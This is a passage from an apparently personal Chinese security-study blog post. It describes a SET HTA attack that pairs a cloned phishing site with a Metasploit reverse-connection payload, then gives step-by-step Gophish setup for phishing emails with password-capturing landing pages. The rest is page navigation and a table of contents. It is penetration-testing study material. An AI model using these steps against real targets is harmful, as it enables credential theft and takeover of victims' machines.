中选择相应选项后可配置创建钓鱼网站方式和服务器地址，选择要组合使用的攻击方法，目标访问时依次触发攻击直至成功。</p><h3 id="（五）HTA-攻击"><a href="#（五）HTA-攻击" class="headerlink" title="（五）HTA 攻击"></a>（五）HTA 攻击</h3><p>利用 HTA 文件进行 PowerShell 注入，可通过浏览器对 Windows 系统利用。操作步骤：</p><ol><li>在 SET 主界面依次选择社会工程学攻击、网站攻击模块、HTA Attack Method。</li><li>选择网站克隆技术创建钓鱼网站页面，设置 Metasploit 的 payload（监听 IP 地址、端口和反向连接协议），SET 自动生成 payload 并启用 Metasploit 框架监听会话。目标单击钓鱼链接后看到弹出窗口提示下载文件，下载打开后运行 HTA 文件执行 payload，若成功攻击者可控制目标主机并获取信息。</li></ol><h2 id="四、钓鱼邮件攻击"><a href="#四、钓鱼邮件攻击" class="headerlink" title="四、钓鱼邮件攻击"></a>四、钓鱼邮件攻击</h2><p>利用电子邮件诱骗目标单击恶意链接或附件，窃取敏感信息或安装恶意软件，通常伪装可信来源并利用情感诱因促使目标行动。常用工具是 Gophish。</p><h3 id="（一）Gophish-的安装和配置"><a href="#（一）Gophish-的安装和配置" class="headerlink" title="（一）Gophish 的安装和配置"></a>（一）Gophish 的安装和配置</h3><ol><li>从 GitHub 下载适合 Kali Linux 的安装包并解压到指定文件夹，赋予可执行权限。</li><li>编辑 <code>config.json</code> 配置文件，可修改后台管理界面和钓鱼网站的地址与端口、数据库相关设置等。例如修改 <code>admin_server.listen_url</code> 可改变后台管理界面访问地址和端口，修改 <code>phish_server.listen_url</code> 可改变钓鱼网站监听地址和端口，还可设置是否使用 TLS 加密等。</li><li>执行 <code>./gophish</code> 命令启动服务，在浏览器输入 <code>https://127.0.0.1:3333</code> 访问后台管理界面，首次登录修改密码后进入主界面。</li></ol><h3 id="（二）使用-Gophish-发起钓鱼邮件攻击"><a href="#（二）使用-Gophish-发起钓鱼邮件攻击" class="headerlink" title="（二）使用 Gophish 发起钓鱼邮件攻击"></a>（二）使用 Gophish 发起钓鱼邮件攻击</h3><ol><li><strong>创建邮箱发送策略</strong>：登录支持相关服务的邮箱（如网易邮箱）开启 IMAP/SMTP 和 POP3/SMTP 服务并新增授权密码。在 Gophish 主界面选择 <code>Sending Profiles</code> 菜单创建策略，输入策略名称、发件人邮箱地址、SMTP 服务器、用户名和密码等信息，可测试发送邮件，保存策略。</li><li><strong>创建钓鱼网站页面</strong>：选择 <code>Landing Pages</code> 菜单创建钓鱼页面，可修改 HTML 或克隆指定 URL 网站，勾选数据捕获和密码捕获功能，填写重定向 URL 地址后保存。</li><li><strong>创建钓鱼邮件模板</strong>：在 <code>Email Templates</code> 菜单创建模板，填写名称等信息，编辑邮件内容（可使用变量如 <code>&#123;&#123;.URL&#125;&#125;</code> 显示钓鱼页面 URL 地址）后保存。</li><li><strong>创建用户和组</strong>：在 <code>Users &amp; Groups</code> 菜单创建组并添加用户，输入组名和用户邮箱地址、姓名等信息后保存。</li><li><strong>发起钓鱼邮件攻击</strong>：在 <code>Campaigns</code> 菜单创建钓鱼活动，选择之前创建的邮箱发送策略、钓鱼页面、邮件模板和用户组，设置活动时间，单击 <code>Launch Campaign</code> 按钮开始攻击，在 <code>Dashboard</code> 菜单查看统计数据和详细信息。</li></ol><h1 id="SRC专项"><a href="#SRC专项" class="headerlink" title="SRC专项"></a>SRC专项</h1><p>想听一下月神小火炬北山的课啊，先挖个坑在这里。</p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者:</span> <span class="post-copyright-info"><a href="https://njmxye.github.io">njmxye</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接:</span> <span class="post-copyright-info"><a href="https://njmxye.github.io/2025/01/14/%E6%A5%A0%E5%AF%BB%E7%BD%91%E5%AE%89%E7%89%88/">https://njmxye.github.io/2025/01/14/%E6%A5%A0%E5%AF%BB%E7%BD%91%E5%AE%89%E7%89%88/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明:</span> <span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://njmxye.github.io" target="_blank">楠 寻 の 小 窝</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/1716767227197.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://lib.baomitu.com/social-share.js/1.0.16/css/share.min.css" media="print" onload='this.media="all"'><script src="https://lib.baomitu.com/social-share.js/1.0.16/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/01/23/%E6%A5%A0%E5%AF%BB%E6%9D%A5%E6%97%B6%E7%89%88/" title="楠寻来时版"><div class="cover" style="background:var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">楠寻来时版</div></div></a></div><div class="next-post pull-right"><a href="/2025/01/11/%E6%A5%A0%E5%AF%BB%E7%BD%91%E6%96%87%E7%89%88/" title="楠寻网文版"><div class="cover" style="background:var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">楠寻网文版</div></div></a></div></nav><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i> <span>评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1716767227197.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info__name">njmxye</div><div class="author-info__description">欢迎来到楠寻的个人博客，这里是我的技术分享和日常记录天地。探讨Web开发、人工智能、数据科学等领域的前沿技术，提供实用编程技巧和项目经验。同时记录生活感悟、阅读心得，分享有趣的日常见闻。让我们一起在技术与生活的交织中，寻找成长的乐趣。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/njmxye"><i class="fab fa-github"></i><span>My Github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/njmxye" target="_blank" title="Github"><i class="fab fa-github" style="color:#24292e"></i></a><a class="social-icon" href="https://www.baidu.com/s?wd=%E6%88%B7%E5%8F%A3%E6%9C%AC%E5%B0%B1%E6%88%91%E4%B8%80%E4%B8%AA%E4%BA%BA%E6%80%8E%E4%B9%88%E5%8A%9E" target="_blank" title="Email"><i class="fas fa-envelope" style="color:#4a7dbe"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">楠寻是个分不清主次的傻逼，不配有梦想。<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="230" height="86" src="//music.163.com/outchain/player?type=2&id=1412559986&auto=1&height=66"></iframe></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">Web笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">一、常用工具安装及使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89Burp-Suite"><span class="toc-number">1.1.1.</span> <span class="toc-text">（一）Burp Suite</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89Sqlmap"><span class="toc-number">1.1.2.</span> <span class="toc-text">（二）Sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%8E%E6%8F%92%E4%BB%B6"><span class="toc-number">1.1.3.</span> <span class="toc-text">（三）浏览器与插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89Nmap"><span class="toc-number">1.1.4.</span> <span class="toc-text">（四）Nmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.</span> <span class="toc-text">二、SQL注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%A6%82%E8%BF%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">（一）概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E5%8F%8A%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">（二）注入类型及利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E6%B3%A8%E5%85%A5%E7%82%B9%E7%9B%B8%E5%85%B3"><span class="toc-number">1.2.3.</span> <span class="toc-text">（三）注入点相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.4.</span> <span class="toc-text">（四）绕过技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89SQL-%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.5.</span> <span class="toc-text">（五）SQL 读写文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%88XSS%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">三、跨站脚本攻击（XSS）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%A6%82%E8%BF%B0-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">（一）概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.3.2.</span> <span class="toc-text">（二）类型详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E9%98%B2%E6%8A%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.3.</span> <span class="toc-text">（三）防护与绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E5%8D%B1%E5%AE%B3%E4%B8%8E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">1.3.4.</span> <span class="toc-text">（四）危害与利用技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.3.5.</span> <span class="toc-text">（五）实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">四、服务端请求伪造（SSRF）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%BD%A2%E6%88%90%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.4.1.</span> <span class="toc-text">（一）形成原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.2.</span> <span class="toc-text">（二）防护绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%8D%B1%E5%AE%B3%E4%B8%8E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7"><span class="toc-number">1.4.3.</span> <span class="toc-text">（三）危害与利用技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.4.4.</span> <span class="toc-text">（四）实例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%88%A9%E7%94%A8%E7%89%B9%E6%80%A7%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.</span> <span class="toc-text">五、利用特性进行攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89PHP-%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7"><span class="toc-number">1.5.1.</span> <span class="toc-text">（一）PHP 语言特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89Windows-%E7%B3%BB%E7%BB%9F%E7%89%B9%E6%80%A7"><span class="toc-number">1.5.2.</span> <span class="toc-text">（二）Windows 系统特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.6.</span> <span class="toc-text">六、代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E9%80%94%E5%BE%84"><span class="toc-number">1.6.1.</span> <span class="toc-text">（一）源码泄露途径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E4%B8%8E%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.2.</span> <span class="toc-text">（二）审计方法与技巧</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.7.</span> <span class="toc-text">七、条件竞争</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%A6%82%E8%BF%B0-2"><span class="toc-number">1.7.1.</span> <span class="toc-text">（一）概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90%E5%8F%8A%E6%B5%8B%E8%AF%95"><span class="toc-number">1.7.2.</span> <span class="toc-text">（二）问题分析及测试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AB%E3%80%81%E6%A1%88%E4%BE%8B%E8%A7%A3%E6%9E%90"><span class="toc-number">1.8.</span> <span class="toc-text">八、案例解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89NSCTF-2015-Web-%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.8.1.</span> <span class="toc-text">（一）NSCTF 2015 Web 实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B9%96%E6%B9%98%E6%9D%AF-2016-%E7%BA%BF%E4%B8%8A%E9%80%89%E6%8B%94%E8%B5%9B-Web-%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.8.2.</span> <span class="toc-text">（二）湖湘杯 2016 线上选拔赛 Web 实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%890CTF-2017-Web-%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.8.3.</span> <span class="toc-text">（三）0CTF 2017 Web 实例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%892019-WCTF-%E5%A4%A7%E5%B8%88%E8%B5%9B%E8%B5%9B%E9%A2%98%E5%89%96%E6%9E%90%EF%BC%9AP-door"><span class="toc-number">1.8.4.</span> <span class="toc-text">（四）2019 WCTF 大师赛赛题剖析：P - door</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse%E7%AC%94%E8%AE%B0"><span class="toc-number">2.</span> <span class="toc-text">Reverse笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80"><span class="toc-number">2.1.</span> <span class="toc-text">一、逆向分析基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E4%B8%BB%E8%A6%81%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">（一）主要方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84"><span class="toc-number">2.1.2.</span> <span class="toc-text">（二）汇编指令体系结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-number">2.2.</span> <span class="toc-text">二、逆向分析工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%8F%8D%E6%B1%87%E7%BC%96%E5%92%8C%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7-IDA-Pro"><span class="toc-number">2.2.1.</span> <span class="toc-text">（一）反汇编和反编译工具 - IDA Pro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E8%B0%83%E8%AF%95%E5%99%A8"><span class="toc-number">2.2.2.</span> <span class="toc-text">（二）调试器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89Trace-%E7%B1%BB%E5%B7%A5%E5%85%B7-Qira"><span class="toc-number">2.2.3.</span> <span class="toc-text">（三）Trace 类工具 - Qira</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81Reverse-%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">三、Reverse 分析流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%B8%B8%E8%A7%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.1.</span> <span class="toc-text">（一）常规逆向分析流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E8%87%AA%E5%8A%A8%E5%8C%96%E9%80%86%E5%90%91"><span class="toc-number">2.3.2.</span> <span class="toc-text">（二）自动化逆向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%B9%B2%E6%89%B0%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95"><span class="toc-number">2.3.3.</span> <span class="toc-text">（三）干扰分析技术及破解方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E7%9A%84%E9%80%86%E5%90%91"><span class="toc-number">2.3.4.</span> <span class="toc-text">（四）脚本语言的逆向</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN%E7%AC%94%E8%AE%B0"><span class="toc-number">3.</span> <span class="toc-text">PWN笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81PWN%E5%9F%BA%E7%A1%80"><span class="toc-number">3.1.</span> <span class="toc-text">一、PWN基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7"><span class="toc-number">3.1.1.</span> <span class="toc-text">（一）基本工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">3.1.2.</span> <span class="toc-text">（二）保护机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89PWN-%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.1.3.</span> <span class="toc-text">（三）PWN 类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.4.</span> <span class="toc-text">（四）常见利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="toc-number">3.1.5.</span> <span class="toc-text">（五）程序内存布局</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%A0%88%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.2.</span> <span class="toc-text">二、栈相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%A0%88%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.2.1.</span> <span class="toc-text">（一）栈介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">3.2.2.</span> <span class="toc-text">（二）栈溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E6%A0%88%E7%9A%84%E7%89%B9%E6%AE%8A%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.3.</span> <span class="toc-text">（三）栈的特殊利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E6%A0%88%E5%96%B7%E5%B0%84"><span class="toc-number">3.2.4.</span> <span class="toc-text">（四）栈喷射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%94%EF%BC%89%E7%BA%BF%E7%A8%8B%E6%A0%88"><span class="toc-number">3.2.5.</span> <span class="toc-text">（五）线程栈</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%85%AD%EF%BC%89%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90"><span class="toc-number">3.2.6.</span> <span class="toc-text">（六）真题解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%A0%86%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">三、堆相关漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%A0%86%E4%BB%8B%E7%BB%8D"><span class="toc-number">3.3.1.</span> <span class="toc-text">（一）堆介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.3.2.</span> <span class="toc-text">（二）漏洞类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.3.3.</span> <span class="toc-text">（三）利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90"><span class="toc-number">3.3.4.</span> <span class="toc-text">（四）真题解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.</span> <span class="toc-text">四、格式化字符串漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">3.4.1.</span> <span class="toc-text">（一）基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%B8%8E%E4%BF%AE%E6%94%B9"><span class="toc-number">3.4.2.</span> <span class="toc-text">（二）信息泄露与修改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E9%A2%9D%E5%A4%96%E6%8A%80%E5%B7%A7"><span class="toc-number">3.4.3.</span> <span class="toc-text">（三）额外技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90-1"><span class="toc-number">3.4.4.</span> <span class="toc-text">（四）真题解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%95%B4%E5%9E%8B%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text">五、整型漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%AE%BD%E5%BA%A6%E6%BA%A2%E5%87%BA"><span class="toc-number">3.5.1.</span> <span class="toc-text">（一）宽度溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E7%AC%A6%E5%8F%B7%E8%BD%AC%E6%8D%A2"><span class="toc-number">3.5.2.</span> <span class="toc-text">（二）符号转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C"><span class="toc-number">3.5.3.</span> <span class="toc-text">（三）数组越界</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90-2"><span class="toc-number">3.5.4.</span> <span class="toc-text">（四）真题解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.6.</span> <span class="toc-text">六、逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5-1"><span class="toc-number">3.6.1.</span> <span class="toc-text">（一）基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.6.2.</span> <span class="toc-text">（二）竞态条件漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90"><span class="toc-number">3.6.3.</span> <span class="toc-text">（三）真题解析</span></a></li></ol></li><li 